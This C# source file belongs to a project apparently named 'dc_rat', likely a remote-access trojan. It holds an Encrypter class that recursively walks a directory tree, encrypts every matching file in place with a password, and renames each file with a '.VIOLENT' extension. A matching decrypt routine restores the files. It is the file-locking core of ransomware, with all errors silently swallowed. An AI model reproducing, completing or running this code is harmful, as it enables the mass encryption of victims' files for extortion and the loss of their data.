using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace dc_rat
{
    internal class Encrypter
    {
        static IEnumerable<string> GetFiles(string path, string typeFilter)
        {
            Queue<string> queue = new Queue<string>();
            queue.Enqueue(path);
            while (queue.Count > 0)
            {
                path = queue.Dequeue();
                try
                {
                    foreach (string subDir in Directory.GetDirectories(path))
                    {
                        queue.Enqueue(subDir);
                    }
                }
                catch { }

                string[] files = null;
                try
                {
                    files = Directory.GetFiles(path, $"{typeFilter}");
                }
                catch { }

                if (files != null)
                {
                    for (int i = 0; i < files.Length; i++)
                    {
                        yield return files[i];
                    }
                }
            }
        }

        public static void Encrypt(string dir, string typeFilter, string password)
        {
            foreach (string file in GetFiles(dir, typeFilter))
            {
                try
                {
                    string content = File.ReadAllText(file);
                    content = Cipher.Encrypt(content, password);
                    File.WriteAllText(file, content);
                    File.Move(file, file + ".VIOLENT");
                }
                catch { }
            }
        }

        public static void Decrypt(string dir, string password)
        {
            foreach (string file in GetFiles(dir, "*.VIOLENT"))
            {
                try
                {
                    string content = File.ReadAllText(file);
                    content = Cipher.Decrypt(content, password);
                    File.WriteAllText(file, content);
                    File.Move(file, file.Replace(".VIOLENT", ""));
                }
                catch { }
            }
        }
    }
}
